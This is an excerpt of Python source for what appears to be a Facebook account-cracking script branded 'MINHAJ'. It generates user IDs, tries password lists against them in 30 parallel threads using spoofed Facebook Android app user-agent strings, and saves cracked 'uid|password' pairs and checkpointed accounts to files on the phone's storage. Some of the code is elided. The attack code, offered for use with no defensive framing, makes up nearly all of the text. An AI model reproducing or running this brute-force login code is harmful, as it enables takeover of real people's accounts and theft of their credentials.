...
def MINHAJ():
    ...
    _____MINHAJ_____ = input(f'{white}[{green}+{white}] {green}SELECT : {yelloww}')
    if _____MINHAJ_____ in ['A','a','01','1']:
        os.system('xdg-open https://www.facebook.com/ctgminhaj484')
        ___uids___()
    elif _____MINHAJ_____ in ['B','b','02','2']:
        os.system('xdg-open https://www.facebook.com/ctgminhaj484')
    elif _____MINHAJ_____ in ['C','c','03','3']:
        os.system('xdg-open')
    elif _____MINHAJ_____ in ['D','d','04','4']:
        exit()
    else:
        print(f'\n[×]{rad} CHOOSE VALID OPTION... ');MINHAJ()
...
def ___uids___():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with tred(max_workers=30) as MINHAJ:
        os.system('clear')
        logo()
        tl = str(len(user))
        ...
        for love in user:
           ...
           MINHAJ.submit(___random___,ids,passlist)
    print('')
    linex()
...
def ___random___(ids,passlist):
    try:
        global oks,loop
        sys.stdout.write(f'\r\r{rad}[{green}𝐒𝐂A𝐍𝐍𝐈𝐍𝐆{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}MINHAJ:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
         ...
         #   ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1920};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
           ...
           # ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2076};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            ...
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print('\r\r\033[1;31m[\033[1;32mMINHAJ\033[1;31m]\033[1;32m '+uid+' | '+pas+'\033[1;97m')
                    open('/sdcard/MINHAJ-OK.txt','a').write(uid+'|'+pas+'\n')
                    oks.append(ids)
                    break
                else:pass
            elif 'www.facebook.com' in q['error_msg']:
                print(f'\r\r\x1b[38;5;208m[DIED] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/MINHAJ-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
